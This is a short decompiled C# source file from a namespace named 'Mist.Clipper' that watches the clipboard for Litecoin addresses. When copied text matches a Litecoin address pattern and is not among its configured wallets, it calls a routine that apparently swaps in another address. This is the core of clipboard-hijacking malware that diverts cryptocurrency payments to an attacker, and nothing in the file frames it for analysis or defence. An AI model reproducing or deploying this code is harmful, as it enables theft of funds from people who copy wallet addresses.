using System;
using System.Linq;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x0200007C RID: 124
	internal class LiteCoin
	{
		// Token: 0x060002DC RID: 732 RVA: 0x0001345C File Offset: 0x0001165C
		public static void GetLiteCoinWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsltc.Contains(text) && CheckLTC.Clipregex(text))
					{
						CheckLTC.SetsLTC(text);
					}
				}
			}
			catch
			{
			}
		}
	}
}
